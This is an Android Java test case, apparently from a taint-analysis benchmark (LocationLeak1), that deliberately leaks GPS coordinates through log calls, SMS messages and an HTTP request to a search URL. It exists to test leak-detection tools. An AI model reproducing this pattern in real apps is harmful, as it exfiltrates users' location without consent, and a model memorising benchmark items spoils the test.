package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.StrictMode;
import android.telephony.SmsManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * @testcase_name LocationLeak1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description This example contains a location information leakage in the onResume() callback method.
 *  The data source is placed into the onLocationChanged() callback method, especially the parameter "loc".
 * @dataflow onLocationChanged: source -> latitude, longtitude; onResume: latitude -> sink, longtitude -> sink 
 * @number_of_leaks 2
 * @challenges the analysis must be able to emulate the Android activity lifecycle correctly,
 *  integrate the callback method onLocationChanged and detect the callback methods as source.
 */
public class LocationLeak1 extends Activity {
	private String latitude = "";
	private String longtitude = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_location_leak1);

		if (android.os.Build.VERSION.SDK_INT > 9) {
			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
			StrictMode.setThreadPolicy(policy);
		}
        
        LocationManager locationManager = (LocationManager) 
        getSystemService(Context.LOCATION_SERVICE);
        
        LocationListener locationListener = new MyLocationListener();  
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, locationListener);            
    }

    @Override
    protected void onResume (){
    	super.onResume();
    	
    	Log.d("Latitude", "Latitude: " + latitude); //sink, leak
    	Log.d("Longtitude", "Longtitude: " + longtitude); //sink, leak
		SmsManager sms = SmsManager.getDefault();
		sms.sendTextMessage("+49", null, "Latitude: " + latitude, null, null);  //sink, leak
		sms.sendTextMessage("+49", null, "Longtitude: " + longtitude, null, null);  //sink, leak
		try {
			connect("Latitude" + latitude);
		} catch (Exception e) {
			e.printStackTrace();
		}
    }

	private void connect(String data) throws IOException {
		String URL = "http://www.google.com/search?q=";
		URL = URL.concat(data);
		java.net.URL url = new URL(URL);
		HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
		conn.setRequestMethod("GET");
		conn.setDoInput(true);
		// Starts the query
		conn.connect();

		InputStream is = conn.getInputStream();
		if (is == null)
			return;
		StringBuilder sb = new StringBuilder();
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		String line = null;
		try {
			while ((line = br.readLine()) != null)
				sb.append(line);
		} finally {
			br.close();
			is.close();
		}
		Log.d(getClass().getSimpleName(), sb.toString());
	}
    
    private class MyLocationListener implements LocationListener {  
		  @Override  
		  public void onLocationChanged(Location loc) {  //source
			  double lat = loc.getLatitude();
				double lon = loc.getLongitude();
				
				latitude =  Double.toString(lat);
				longtitude = Double.toString(lon);
		  }  

		  @Override  
		  public void onProviderDisabled(String provider) {}  

		  @Override  
		  public void onProviderEnabled(String provider) { }  

		  @Override  
		  public void onStatusChanged(String provider, int status, Bundle extras) {}  
    }
}
